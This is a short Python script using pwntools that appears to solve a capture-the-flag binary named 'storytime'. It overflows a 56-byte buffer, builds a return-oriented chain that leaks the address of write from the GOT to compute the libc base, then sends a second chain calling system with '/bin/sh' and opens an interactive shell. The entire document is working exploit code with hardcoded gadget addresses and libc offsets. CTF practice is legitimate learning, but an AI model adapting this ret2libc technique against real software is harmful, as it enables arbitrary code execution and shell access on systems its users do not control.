from pwn import *

target = process("./storytime")

writePLT = 0x4004a0
writeGOT = 0x601018
write_offset = 0xef8f0
popRSI = 0x0000000000400701
popRDI = 0x0000000000400703
awrite = 0x400601
binsh = 0x18bb62
system = 0x49de0

exploit = "s" * 56
exploit += p64(popRSI)
exploit += p64(writeGOT)
exploit += p64(0x3030303030303030)
exploit += p64(0x400601)
exploit += p64(0x3030303030303030)
exploit += p64(0x40060e)

target.sendline(exploit)
target.recvuntil("Tell me a story: \n")
libc_base = (u64(target.recv(8))-write_offset)

exploit = "s" * 56
exploit += p64(popRDI)
exploit += p64(libc_base + binsh)
exploit += p64(libc_base + system)
target.sendline(exploit)


target.interactive()